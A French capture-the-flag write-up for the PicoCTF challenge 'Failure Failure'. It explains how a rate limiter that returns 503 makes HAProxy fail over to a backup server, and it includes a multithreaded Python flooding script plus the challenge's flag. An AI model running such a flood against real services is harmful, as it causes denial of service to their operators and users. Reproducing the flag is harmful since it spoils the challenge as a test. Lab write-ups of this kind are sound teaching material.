# Writeup PicoCTF - Failure Failure

**Challenge :** Failure Failure
**Catégorie :** Web Exploitation / Infrastructure
**Points :** 200 pts
**Flag :** `picoCTF{f41l0v3r_f0r_7h3_w1n_df560c35}`

## Description

Le challenge simule un environnement haute disponibilité (HA) avec un load balancer HAProxy et deux serveurs Flask. Le flag n'est présent que sur le serveur de backup.

## Analyse des fichiers fournis

### 1. Application Flask (`app.py`)

L'application possède un rate limiter (`Limiter`) configuré avec une limite de **300 requêtes par minute**. Un gestionnaire d'erreurs transforme l'erreur 429 (Too Many Requests) en une erreur **503 (Service Unavailable)**.

```python
@app.errorhandler(429)
def ratelimit_exceeded(e):
    return "Service Unavailable: Rate limit exceeded", 503

@app.route('/')
def home():
    if os.getenv("IS_BACKUP") == "yes":
        flag = os.getenv("FLAG")
    else:
        flag = "No flag in this service"
    return render_template("index.html", flag=flag)
```

### 2. Configuration HAProxy (`haproxy.cfg`)

Le load balancer a deux serveurs en backend : `s1` (principal) et `s2` (backup). Un health check est configuré pour s'attendre à un statut HTTP 200.

```haproxy
backend servers
    option httpchk GET /
    http-check expect status 200
    server s1 *:8000 check inter 2s fall 2 rise 3
    server s2 *:9000 check backup inter 2s fall 2 rise 3
```

## Étapes de la solution

### 1. Stratégie

L'objectif est de déclencher le mécanisme de "failover". Si nous saturons le serveur `s1` en envoyant plus de 300 requêtes par minute, il commencera à répondre avec un code HTTP 503. Le health check de HAProxy échouera, marquera `s1` comme "down", et redirigera tout le trafic vers `s2` (le backup), qui contient le flag.

### 2. Exploitation

J'ai utilisé un script Python multithreadé pour saturer rapidement le serveur :

```python
import requests
import threading
import time

URL = "http://mysterious-sea.picoctf.net:49226/"

def flood():
    while True:
        try: requests.get(URL, timeout=1)
        except: pass

# Lancement de 50 threads de saturation
for i in range(50):
    threading.Thread(target=flood, daemon=True).start()

# Attente du basculement (fall 2 * inter 2s = 4s+)
time.sleep(5)

# Récupération du flag
r = requests.get(URL)
if "picoCTF" in r.text:
    print(r.text)
```

### 3. Résultat

Après environ 5 secondes de flood, HAProxy a basculé sur le backup et a renvoyé :

**Flag :** `picoCTF{f41l0v3r_f0r_7h3_w1n_df560c35}`

## Concepts clés retenus

* **Health Checks** : Les load balancers dépendent des codes de statut HTTP pour déterminer la santé des serveurs.
* **Rate Limiting as a Vulnerability** : Une limite de taux globale mal configurée peut être utilisée pour déclencher un déni de service (DoS) local ou un failover non désiré.
* **HAProxy backup servers** : Utilisation du mot-clé `backup` pour les serveurs de secours.
